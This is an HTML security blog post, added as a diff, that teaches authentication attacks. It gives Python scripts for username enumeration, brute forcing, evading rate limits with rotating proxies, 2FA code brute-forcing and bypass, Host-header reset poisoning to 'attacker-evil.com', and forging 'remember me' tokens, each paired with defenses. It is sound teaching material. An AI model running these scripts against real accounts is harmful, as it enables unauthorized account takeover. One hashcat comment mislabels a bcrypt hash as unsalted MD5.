@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Authentication Vulnerabilities Deep Dive: From Enumeration to 2FA Bypass | Raghava Gatadi</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Inter', sans-serif; background-color: #050505; color: #a3a3a3; }
+    .prose h2 { color: #ffffff; margin-top: 3rem; margin-bottom: 1rem; font-weight: 700; font-size: 1.5rem; letter-spacing: -0.025em; }
+    .prose h3 { color: #e5e5e5; margin-top: 2rem; margin-bottom: 0.75rem; font-weight: 600; font-size: 1.25rem; }
+    .prose p { margin-bottom: 1.5rem; line-height: 1.8; font-size: 1.05rem; }
+    .prose strong { color: #fff; font-weight: 600; }
+    .prose ul { margin-bottom: 1.5rem; }
+    .prose li { margin-bottom: 0.75rem; padding-left: 0.5rem; }
+    .prose code { background: #1a1a1a; padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'JetBrains Mono', monospace; color: #818cf8; font-size: 0.9em; }
+    
+    .code-block { 
+        background: #0a0a0a; 
+        border: 1px solid #1a1a1a; 
+        padding: 1.5rem; 
+        border-radius: 0.75rem; 
+        overflow-x: auto; 
+        font-family: 'JetBrains Mono', monospace; 
+        font-size: 0.875rem; 
+        color: #a5b4fc; 
+        margin: 2rem 0;
+        line-height: 1.6;
+    }
+
+    .highlight-box { 
+        border-left: 4px solid #6366f1; 
+        background: #0f111a; 
+        padding: 1.5rem; 
+        border-radius: 0 0.75rem 0.75rem 0; 
+        margin: 2.5rem 0; 
+        color: #cbd5e1; 
+    }
+
+    .stat-card { 
+        background: #0a0a0a; 
+        border: 1px solid #1a1a1a; 
+        padding: 1.5rem; 
+        border-radius: 0.75rem; 
+        transition: border-color 0.3s ease;
+    }
+    .stat-card:hover { border-color: #6366f1; }
+
+    .vuln-card {
+        background: #1a0f0f;
+        border: 1px solid #7f1d1d;
+        border-left: 4px solid #ef4444;
+        padding: 1.25rem;
+        border-radius: 0 0.5rem 0.5rem 0;
+        margin: 1rem 0;
+    }
+
+    .defense-card {
+        background: #0f1a15;
+        border: 1px solid #14532d;
+        border-left: 4px solid #10b981;
+        padding: 1.25rem;
+        border-radius: 0 0.5rem 0.5rem 0;
+        margin: 1rem 0;
+    }
+
+    .tech-tag { 
+        display: inline-block; 
+        background: #1e1b4b; 
+        color: #a5b4fc; 
+        padding: 0.25rem 0.75rem; 
+        border-radius: 9999px; 
+        font-size: 0.75rem; 
+        font-family: 'JetBrains Mono', monospace; 
+        margin: 0.25rem 0.25rem 0.25rem 0; 
+        border: 1px solid #3730a3;
+    }
+
+    .attack-flow {
+        background: #0a0a0a;
+        border: 1px solid #1a1a1a;
+        border-radius: 0.75rem;
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 0.875rem;
+    }
+
+    .flow-step {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        padding: 0.5rem 0;
+    }
+
+    .flow-arrow {
+        color: #6366f1;
+        font-weight: bold;
+    }
+  </style>
+</head>
+<body class="antialiased">
+
+  <!-- Minimal Navigation -->
+  <nav class="border-b border-[#141414] sticky top-0 bg-[#050505]/80 backdrop-blur-md z-50">
+    <div class="max-w-3xl mx-auto px-6 py-4 flex justify-between items-center">
+      <a href="../../index.html" class="text-sm font-bold text-white tracking-tighter hover:text-indigo-400 transition">&larr; Back to Writing</a>
+      <span class="text-xs font-mono text-gray-600 uppercase tracking-widest">Security Research // Authentication</span>
+    </div>
+  </nav>
+
+  <main class="max-w-3xl mx-auto px-6 py-16">
+    
+    <!-- Article Header -->
+    <header class="mb-12">
+      <h1 class="text-4xl md:text-5xl font-bold text-white tracking-tight leading-tight mb-8">
+        Authentication Vulnerabilities Deep Dive: From Enumeration to 2FA Bypass
+      </h1>
+      <div class="flex flex-wrap gap-6 text-xs font-mono text-gray-500 uppercase tracking-widest">
+        <div class="flex items-center gap-2">
+            <span class="w-2 h-2 rounded-full bg-red-500"></span>
+            Web Security Research
+        </div>
+        <span>March 8, 2026</span>
+        <span>15 Min Read</span>
+      </div>
+    </header>
+
+    <!-- Executive Summary -->
+    <div class="highlight-box">
+        <p class="text-lg"><strong>Overview:</strong> Authentication is the gatekeeper of every web application. When it fails, attackers gain unauthorized access to user accounts, sensitive data, and administrative functions. This post explores the most critical authentication vulnerabilities—from username enumeration and brute-force bypasses to 2FA logic flaws and password reset poisoning—with practical examples and defensive recommendations.</p>
+    </div>
+
+    <!-- Article Content -->
+    <article class="prose text-gray-400">
+      <p>
+        Authentication is the process of verifying the identity of a user or client. It's the foundation of access control in web applications. Yet, despite its critical importance, authentication mechanisms are frequently misimplemented, creating exploitable vulnerabilities that attackers can leverage to bypass security controls entirely.
+      </p>
+
+      <p>
+        In this comprehensive guide, we'll explore the most common and dangerous authentication vulnerabilities, how they arise, how to detect them, and—most importantly—how to prevent them. Each section includes practical examples and Python scripts using the <code>requests</code> library to demonstrate attack techniques.
+      </p>
+
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 my-10 text-center">
+        <div class="stat-card">
+            <div class="text-red-500 text-3xl font-bold">3</div>
+            <div class="text-gray-500 text-xs uppercase mt-2 tracking-widest">Authentication Factors</div>
+        </div>
+        <div class="stat-card">
+            <div class="text-red-500 text-3xl font-bold">12+</div>
+            <div class="text-gray-500 text-xs uppercase mt-2 tracking-widest">Vulnerability Classes</div>
+        </div>
+        <div class="stat-card">
+            <div class="text-red-500 text-3xl font-bold">100%</div>
+            <div class="text-gray-500 text-xs uppercase mt-2 tracking-widest">Preventable</div>
+        </div>
+      </div>
+
+      <h2>Understanding Authentication: The Three Factors</h2>
+      <p>
+        Before diving into vulnerabilities, it's essential to understand what we're protecting. Authentication typically relies on one or more of three factors:
+      </p>
+
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 my-8">
+        <div class="stat-card">
+            <h4 class="text-white font-bold mb-2">🔐 Something You Know</h4>
+            <p class="text-xs text-gray-500">Passwords, PINs, security questions. Most common but vulnerable to guessing, phishing, and credential stuffing.</p>
+        </div>
+        <div class="stat-card">
+            <h4 class="text-white font-bold mb-2">📱 Something You Have</h4>
+            <p class="text-xs text-gray-500">Mobile devices, hardware tokens, smart cards. Adds a layer of security but can be lost, stolen, or bypassed via logic flaws.</p>
+        </div>
+        <div class="stat-card">
+            <h4 class="text-white font-bold mb-2">👤 Something You Are</h4>
+            <p class="text-xs text-gray-500">Biometrics: fingerprints, facial recognition, behavioral patterns. Convenient but raises privacy concerns and can be spoofed.</p>
+        </div>
+      </div>
+
+      <p>
+        Most authentication vulnerabilities arise from one of two root causes:
+      </p>
+      <ul>
+        <li><strong>Weak mechanisms:</strong> Inadequate protection against brute-force attacks, predictable tokens, or insufficient rate limiting.</li>
+        <li><strong>Logic flaws:</strong> Poor implementation that allows attackers to bypass authentication entirely through clever manipulation of requests, parameters, or workflows.</li>
+      </ul>
+
+      <h2>Category 1: Username Enumeration</h2>
+      <p>
+        Username enumeration occurs when an application reveals whether a given username exists in its database. This seemingly minor information leak significantly reduces the attack surface for subsequent attacks like password guessing or targeted phishing.
+      </p>
+
+      <h3>How Enumeration Happens</h3>
+      <p>
+        Applications often leak username validity through subtle differences in their responses. Attackers monitor these signals to build a list of valid accounts:
+      </p>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🔍 HTTP Status Code Differences</h4>
+        <p class="text-sm mb-2">A valid username might return <code>200 OK</code> while an invalid one returns <code>401 Unauthorized</code> or <code>403 Forbidden</code>.</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre># Python detection script
+import requests
+
+def enumerate_usernames(url, usernames):
+    for username in usernames:
+        response = requests.post(url, data={'username': username, 'password': 'test'})
+        if response.status_code == 200:
+            print(f"[+] Valid username: {username}")
+        else:
+            print(f"[-] Invalid username: {username}")</pre>
+        </div>
+      </div>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">📝 Error Message Variations</h4>
+        <p class="text-sm mb-2">Even a single character difference in error messages can leak information:</p>
+        <ul class="text-sm text-gray-400">
+            <li>• "Invalid username or password" (generic, safe)</li>
+            <li>• "Username not found" vs. "Incorrect password" (dangerous)</li>
+            <li>• Hidden whitespace or encoding differences in responses</li>
+        </ul>
+      </div>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">⏱️ Response Timing Attacks</h4>
+        <p class="text-sm mb-2">If the application checks the password only after validating the username, valid usernames may take slightly longer to process:</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre>import requests
+import time
+
+def timing_enumeration(url, usernames):
+    baseline = []
+    # Establish baseline with known invalid usernames
+    for _ in range(10):
+        start = time.time()
+        requests.post(url, data={'username': 'invalid_user', 'password': 'test'})
+        baseline.append(time.time() - start)
+    
+    avg_baseline = sum(baseline) / len(baseline)
+    
+    # Test target usernames
+    for username in usernames:
+        start = time.time()
+        requests.post(url, data={'username': username, 'password': 'test'})
+        elapsed = time.time() - start
+        
+        if elapsed > avg_baseline + 0.1:  # Threshold
+            print(f"[+] Likely valid: {username} ({elapsed:.3f}s)")</pre>
+        </div>
+      </div>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🔒 Account Lockout Messages</h4>
+        <p class="text-sm mb-2">If an application locks accounts after failed attempts, the message "Account locked" confirms the username exists—even if the attacker never knew the correct password.</p>
+      </div>
+
+      <h3>Prevention Strategies</h3>
+      <div class="defense-card">
+        <strong class="text-white">✅ Use Generic Error Messages</strong>
+        <p class="text-sm text-gray-400 mt-2">Always return identical messages and HTTP status codes regardless of whether the username or password was incorrect.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Normalize Response Times</strong>
+        <p class="text-sm text-gray-400 mt-2">Add artificial delays to ensure all login attempts take approximately the same time, regardless of input validity.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Avoid Username Disclosure</strong>
+        <p class="text-sm text-gray-400 mt-2">Don't reveal whether an email is registered during password reset or registration flows. Use "If this account exists, we've sent instructions."</p>
+      </div>
+
+      <h2>Category 2: Brute-Force Attacks & Protection Bypasses</h2>
+      <p>
+        Brute-force attacks systematically guess passwords until one works. While conceptually simple, they're often effective due to weak passwords and inadequate rate limiting.
+      </p>
+
+      <h3>Basic Brute-Force with Python</h3>
+      <div class="code-block">
+<pre>import requests
+from itertools import product
+import string
+
+def brute_force_login(url, username, password_list):
+    session = requests.Session()
+    
+    for password in password_list:
+        response = session.post(url, data={
+            'username': username,
+            'password': password
+        })
+        
+        if "Welcome" in response.text or response.status_code == 302:
+            print(f"[+] Success! Password: {password}")
+            return password
+    
+    print("[-] Password not found in list")
+    return None</pre>
+      </div>
+
+      <h3>Bypassing Rate Limiting Protections</h3>
+      <p>
+        Applications often implement brute-force protection via account locking or IP-based rate limiting. Attackers have developed clever workarounds:
+      </p>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🔄 Multiple Credentials Per Request</h4>
+        <p class="text-sm mb-2">If an application accepts multiple username/password pairs in a single request (e.g., via JSON array), rate limits may apply per request, not per credential:</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre># Bypass: Send 50 credentials in one request
+payload = {
+    "credentials": [
+        {"username": "admin", "password": "pass1"},
+        {"username": "admin", "password": "pass2"},
+        # ... 48 more attempts
+    ]
+}
+requests.post(url, json=payload)  # Counts as 1 request</pre>
+        </div>
+      </div>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🌐 IP Rotation & Proxy Chains</h4>
+        <p class="text-sm mb-2">When rate limiting is IP-based, attackers rotate source IPs using proxy lists or cloud functions:</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre>import requests
+from itertools import cycle
+
+proxies = cycle([
+    'http://proxy1:8080',
+    'http://proxy2:8080',
+    'http://proxy3:8080',
+])
+
+def brute_force_with_rotation(url, username, passwords):
+    for password in passwords:
+        proxy = {'http': next(proxies), 'https': next(proxies)}
+        response = requests.post(
+            url, 
+            data={'username': username, 'password': password},
+            proxies=proxy,
+            timeout=5
+        )
+        # Check for success...</pre>
+        </div>
+      </div>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🔐 Exploiting Weak Lockout Logic</h4>
+        <p class="text-sm mb-2">Some applications reset failed attempt counters upon successful login. Attackers can intersperse correct passwords for other accounts to keep counters low while brute-forcing a target.</p>
+      </div>
+
+      <h3>Prevention Strategies</h3>
+      <div class="defense-card">
+        <strong class="text-white">✅ Implement Exponential Backoff</strong>
+        <p class="text-sm text-gray-400 mt-2">Increase delay between attempts exponentially per account, not just per IP. Track attempts server-side with secure, tamper-proof storage.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Use CAPTCHA After Thresholds</strong>
+        <p class="text-sm text-gray-400 mt-2">Require CAPTCHA completion after 3-5 failed attempts. Use modern, accessibility-friendly implementations like hCaptcha or reCAPTCHA v3.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Monitor for Credential Stuffing</strong>
+        <p class="text-sm text-gray-400 mt-2">Detect patterns indicative of automated attacks: high request volume, rotating IPs, consistent user-agent strings. Integrate with threat intelligence feeds.</p>
+      </div>
+
+      <h2>Category 3: Two-Factor Authentication (2FA) Vulnerabilities</h2>
+      <p>
+        Two-factor authentication adds a critical layer of security by requiring a second verification step. However, flawed implementations can render 2FA useless—or even introduce new attack vectors.
+      </p>
+
+      <h3>Common 2FA Bypass Techniques</h3>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🚪 Skipping the Second Factor</h4>
+        <p class="text-sm mb-2">If the application grants partial access after password verification, attackers may directly access "logged-in" endpoints before completing 2FA:</p>
+        <div class="attack-flow">
+            <div class="flow-step"><span class="flow-arrow">1→</span> POST /login with valid credentials</div>
+            <div class="flow-step"><span class="flow-arrow">2→</span> Receive session cookie + redirect to /2fa</div>
+            <div class="flow-step"><span class="flow-arrow">3→</span> <strong>Bypass:</strong> Directly request /dashboard with session cookie</div>
+            <div class="flow-step"><span class="flow-arrow">4→</span> Access granted if /dashboard doesn't re-verify 2FA completion</div>
+        </div>
+      </div>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🔄 Flawed Verification Logic</h4>
+        <p class="text-sm mb-2">Some applications use cookies to track which user is completing 2FA. If this cookie can be modified, attackers can submit valid codes for their own account while targeting a victim:</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre># Attacker logs in with own credentials
+session = requests.Session()
+session.post('/login', data={'user': 'attacker', 'pass': 'valid'})
+
+# Application sets cookie: account=attacker
+# Attacker changes cookie to target victim:
+session.cookies.set('account', 'victim_user')
+
+# Now submits brute-forced 2FA codes
+for code in range(100000, 999999):
+    resp = session.post('/2fa/verify', data={'code': code})
+    if "Welcome" in resp.text:
+        print(f"[+] Compromised victim with code: {code}")
+        break</pre>
+        </div>
+      </div>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🔢 Brute-Forcing Short Codes</h4>
+        <p class="text-sm mb-2">If 2FA codes are short (4-6 digits) and lack rate limiting, they can be brute-forced. A 6-digit code has only 1,000,000 possibilities—trivial for automated tools:</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre>def brute_force_2fa(url, session, max_attempts=1000000):
+    for code in range(100000, 999999):
+        response = session.post(f'{url}/verify', data={'code': str(code)})
+        if 'success' in response.text.lower():
+            return code
+        # Optional: Add small delay to avoid triggering rate limits
+        time.sleep(0.01)
+    return None</pre>
+        </div>
+      </div>
+
+      <h3>Prevention Strategies</h3>
+      <div class="defense-card">
+        <strong class="text-white">✅ Enforce 2FA Completion Server-Side</strong>
+        <p class="text-sm text-gray-400 mt-2">Never grant access to protected resources until 2FA is fully verified. Use server-side session flags, not client-controlled cookies.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Use Sufficient Code Entropy</strong>
+        <p class="text-sm text-gray-400 mt-2">Require 6+ digit codes with exponential backoff after failed attempts. Consider time-based (TOTP) or push-based methods over SMS.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Bind 2FA Sessions to User Context</strong>
+        <p class="text-sm text-gray-400 mt-2">Ensure the user completing 2FA is the same user who initiated login. Validate user identity at each step using server-side session data.</p>
+      </div>
+
+      <h2>Category 4: Password Reset & Change Vulnerabilities</h2>
+      <p>
+        Password reset and change functionality is often overlooked during security reviews, yet it represents a high-value attack surface. Flaws here can allow attackers to hijack accounts without knowing the current password.
+      </p>
+
+      <h3>Password Reset Poisoning</h3>
+      <p>
+        Password reset poisoning occurs when an application uses untrusted input (like HTTP headers) to generate password reset links. Attackers can manipulate these to redirect victims to malicious domains:
+      </p>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🎣 Host Header Injection</h4>
+        <p class="text-sm mb-2">If the application uses the <code>Host</code> header to construct reset URLs, attackers can poison the link:</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre># Legitimate request:
+POST /forgot-password HTTP/1.1
+Host: legitimate-bank.com
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@example.com
+
+# Attacker's poisoned request:
+POST /forgot-password HTTP/1.1
+Host: attacker-evil.com
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@example.com
+
+# Application generates:
+# https://attacker-evil.com/reset?token=SECRET123
+# Victim clicks → attacker captures token → resets password</pre>
+        </div>
+      </div>
+
+      <h3>Password Change Logic Flaws</h3>
+      <p>
+        Password change pages often reuse authentication logic from login forms. If not properly secured, they can be exploited to enumerate users or brute-force passwords:
+      </p>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🎯 Direct Access Without Authentication</h4>
+        <p class="text-sm mb-2">If the password change endpoint doesn't verify the user is logged in, attackers can target arbitrary accounts by manipulating the username parameter:</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre># Vulnerable endpoint: POST /change-password
+# Attacker sends:
+requests.post('/change-password', data={
+    'username': 'admin',  # Target account
+    'current_password': 'guess1',
+    'new_password': 'hacked'
+})
+# If response differs for valid/invalid current_password,
+# attacker can brute-force the admin's password</pre>
+        </div>
+      </div>
+
+      <h3>Prevention Strategies</h3>
+      <div class="defense-card">
+        <strong class="text-white">✅ Use Absolute, Whitelisted Domains</strong>
+        <p class="text-sm text-gray-400 mt-2">Never construct URLs from user-controllable headers. Use a hardcoded, allow-listed domain for all password reset links.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Require Current Password + Session Validation</strong>
+        <p class="text-sm text-gray-400 mt-2">Password change endpoints must verify the user is authenticated AND provide the current password. Use server-side session validation, not client parameters.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Implement Token Expiration & Single-Use</strong>
+        <p class="text-sm text-gray-400 mt-2">Password reset tokens should expire quickly (15-30 minutes) and be invalidated after first use. Store token hashes, not plaintext, in the database.</p>
+      </div>
+
+      <h2>Category 5: "Remember Me" & Session Management Flaws</h2>
+      <p>
+        "Remember me" functionality uses persistent cookies to maintain sessions across browser restarts. If these tokens are predictable or poorly protected, they become a direct path to account takeover.
+      </p>
+
+      <h3>Predictable Token Generation</h3>
+      <p>
+        Some applications generate "remember me" tokens using weak algorithms:
+      </p>
+
+      <ul>
+        <li><strong>Username + Timestamp:</strong> <code>base64(username + str(int(time.time())))</code></li>
+        <li><strong>Password Hash Reuse:</strong> Using the password hash directly as the token</li>
+        <li><strong>Sequential IDs:</strong> Incrementing integers or easily guessable patterns</li>
+      </ul>
+
+      <div class="vuln-card">
+        <h4 class="text-white font-bold mb-2">🔓 Token Reverse-Engineering</h4>
+        <p class="text-sm mb-2">If attackers can register their own account, they can analyze their token to deduce the generation formula:</p>
+        <div class="code-block" style="margin: 1rem 0;">
+<pre>import base64
+import time
+
+# Attacker registers account, receives cookie:
+# remember_me=ZXhhbXBsZToxNzA5MjM0NTY3
+
+# Decode and analyze:
+decoded = base64.b64decode('ZXhhbXBsZToxNzA5MjM0NTY3').decode()
+# Result: "example:1709234567"
+
+# Pattern identified: username:timestamp
+# Attacker can now forge tokens for other users:
+def forge_token(username, target_timestamp):
+    payload = f"{username}:{target_timestamp}"
+    return base64.b64encode(payload.encode()).decode()
+
+# Brute-force tokens for admin:
+for ts in range(1709230000, 1709240000):
+    token = forge_token('admin', ts)
+    response = requests.get('https://target.com/dashboard', 
+                          cookies={'remember_me': token})
+    if 'Welcome, admin' in response.text:
+        print(f"[+] Compromised admin with timestamp: {ts}")
+        break</pre>
+        </div>
+      </div>
+
+      <h3>Prevention Strategies</h3>
+      <div class="defense-card">
+        <strong class="text-white">✅ Use Cryptographically Secure Random Tokens</strong>
+        <p class="text-sm text-gray-400 mt-2">Generate tokens with <code>secrets.token_urlsafe(32)</code> or equivalent. Ensure 128+ bits of entropy.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Store Token Hashes, Not Plaintext</strong>
+        <p class="text-sm text-gray-400 mt-2">Hash tokens before storing in the database (like passwords). This prevents token theft from database breaches.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Implement Token Rotation & Expiration</strong>
+        <p class="text-sm text-gray-400 mt-2">Issue new tokens on each use and invalidate old ones. Set reasonable expiration (7-30 days) and allow users to revoke sessions.</p>
+      </div>
+
+      <h2>Category 6: Offline Password Cracking</h2>
+      <p>
+        When applications store password hashes insecurely (e.g., unsalted MD5, weak algorithms), attackers who obtain the database can crack passwords offline at massive scale.
+      </p>
+
+      <h3>Common Weaknesses</h3>
+      <ul>
+        <li><strong>No Salt:</strong> Identical passwords produce identical hashes, enabling rainbow table attacks.</li>
+        <li><strong>Fast Hashes:</strong> MD5, SHA-1, or unsalted SHA-256 can be computed billions of times per second on modern hardware.</li>
+        <li><strong>Weak Algorithms:</strong> Legacy systems using DES, LM hashes, or custom broken schemes.</li>
+      </ul>
+
+      <h3>Cracking with Hashcat (Example)</h3>
+      <div class="code-block">
+<pre># Extract hashes from database (example: unsalted MD5)
+# admin:$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
+
+# Use Hashcat with rockyou.txt wordlist:
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# -m 3200 = bcrypt (adjust for your hash type)
+# Add rules for mutations: -r rules/best64.rule
+# Use GPU acceleration: -d 1 (first GPU)</pre>
+      </div>
+
+      <h3>Prevention Strategies</h3>
+      <div class="defense-card">
+        <strong class="text-white">✅ Use Adaptive, Memory-Hard Hashes</strong>
+        <p class="text-sm text-gray-400 mt-2">Prefer Argon2id, bcrypt, or scrypt with appropriate work factors. These resist GPU/ASIC acceleration and scale with hardware improvements.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Always Salt Passwords</strong>
+        <p class="text-sm text-gray-400 mt-2">Use unique, random salts per password (16+ bytes). Store salts alongside hashes. Never reuse salts across users.</p>
+      </div>
+      <div class="defense-card">
+        <strong class="text-white">✅ Enforce Strong Password Policies</strong>
+        <p class="text-sm text-gray-400 mt-2">Require minimum length (12+ characters), complexity, and check against breached password databases (e.g., HaveIBeenPwned API).</p>
+      </div>
+
+      <h2>Building a Robust Authentication System: Defense-in-Depth</h2>
+      <p>
+        No single control is sufficient. Effective authentication security requires layered defenses:
+      </p>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-8">
+        <div class="stat-card">
+            <h4 class="text-white font-bold mb-2">🛡️ Input Validation & Output Encoding</h4>
+            <p class="text-xs text-gray-500">Sanitize all user input. Encode outputs to prevent injection attacks that could bypass authentication logic.</p>
+        </div>
+        <div class="stat-card">
+            <h4 class="text-white font-bold mb-2">🔐 Secure Session Management</h4>
+            <p class="text-xs text-gray-500">Use secure, HttpOnly, SameSite cookies. Implement proper session invalidation on logout and password change.</p>
+        </div>
+        <div class="stat-card">
+            <h4 class="text-white font-bold mb-2">📊 Comprehensive Logging & Monitoring</h4>
+            <p class="text-xs text-gray-500">Log authentication events (success/failure, IP, user-agent). Alert on anomalous patterns: geographic impossibilities, velocity checks.</p>
+        </div>
+        <div class="stat-card">
+            <h4 class="text-white font-bold mb-2">🧪 Regular Security Testing</h4>
+            <p class="text-xs text-gray-500">Conduct automated scans, manual penetration tests, and bug bounty programs. Treat authentication as a critical attack surface.</p>
+        </div>
+      </div>
+
+      <div class="highlight-box" style="border-left-color: #10b981; background: #0f1a15;">
+        <p class="mb-0"><strong>Key Principle:</strong> Authentication is not a feature—it's a security boundary. Every decision in its design has cascading implications for the entire application's security posture. When in doubt, favor simplicity, explicitness, and defense-in-depth.</p>
+      </div>
+
+      <h2>Conclusion</h2>
+      <p>
+        Authentication vulnerabilities remain among the most prevalent and impactful security flaws in web applications. From subtle enumeration leaks to critical 2FA bypasses, attackers continuously evolve their techniques to exploit implementation weaknesses.
+      </p>
+      <p>
+        The good news? Every vulnerability discussed here is preventable with careful design, secure defaults, and rigorous testing. By understanding these attack patterns and implementing layered defenses, developers can build authentication systems that protect users without sacrificing usability.
+      </p>
+      <p>
+        As you build or audit authentication flows, remember: security is a process, not a product. Stay curious, test adversarially, and never assume a control is "good enough." The attackers certainly won't.
+      </p>
+
+      <div class="tech-tag">Web Security</div>
+      <div class="tech-tag">Authentication</div>
+      <div class="tech-tag">PortSwigger</div>
+      <div class="tech-tag">Python</div>
+      <div class="tech-tag">Penetration Testing</div>
+      <div class="tech-tag">Secure Development</div>
+
+    </article>
+
+    <!-- Footer / CTA -->
+    <footer class="mt-20 pt-12 border-t border-[#141414]">
+      
+      <div class="bg-[#0a0a0a] border border-[#1a1a1a] rounded-lg p-6 mb-12">
+        <h3 class="text-white font-bold mb-4">Further Learning</h3>
+        <p class="text-sm text-gray-400 mb-4">Want to practice these techniques in a safe, legal environment? The PortSwigger Web Security Academy offers free, hands-on labs for every vulnerability covered here.</p>
+        <div class="flex flex-col md:flex-row gap-4">
+            <a href="https://portswigger.net/web-security/authentication" target="_blank" class="stat-card block hover:border-indigo-500 text-center py-4">
+                <div class="text-indigo-500 font-bold mb-1">🎓 PortSwigger Authentication Path</div>
+                <div class="text-xs text-gray-500">Free interactive labs</div>
+            </a>
+            <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank" class="stat-card block hover:border-indigo-500 text-center py-4">
+                <div class="text-indigo-500 font-bold mb-1">📋 OWASP Authentication Cheat Sheet</div>
+                <div class="text-xs text-gray-500">Implementation guidelines</div>
+            </a>
+        </div>
+      </div>
+
+      <div class="text-center">
+        <p class="text-sm text-gray-500 mb-8 font-mono">SECURITY_RESEARCH_COMPLETE // EDUCATIONAL_CONTENT</p>
+        <div class="flex flex-col md:flex-row justify-center gap-4">
+          <a href="https://linkedin.com/in/raghava-gatadi" target="_blank" class="text-xs font-bold bg-white text-black px-8 py-3 rounded-lg hover:bg-gray-200 transition uppercase tracking-widest">
+              Connect on LinkedIn
+          </a>
+          <a href="https://github.com/Raghava-Gatadi/auth-vulnerabilities-scripts" target="_blank" class="text-xs font-bold border border-[#222] text-white px-8 py-3 rounded-lg hover:bg-[#111] transition uppercase tracking-widest">
+              View on GitHub
+          </a>
+        </div>
+      </div>
+
+      <div class="mt-12 pt-8 border-t border-[#141414] text-center text-xs text-gray-600">
+        <p>This content is for educational purposes only. Always obtain explicit authorization before testing security controls on systems you do not own.</p>
+      </div>
+    </footer>
+
+  </main>
+
+  <footer class="py-12 text-center text-gray-700 text-xs">
+    <p>&copy; 2026 Raghava Gatadi &middot; Security Research & Education</p>
+  </footer>
+
+</body>
+</html>
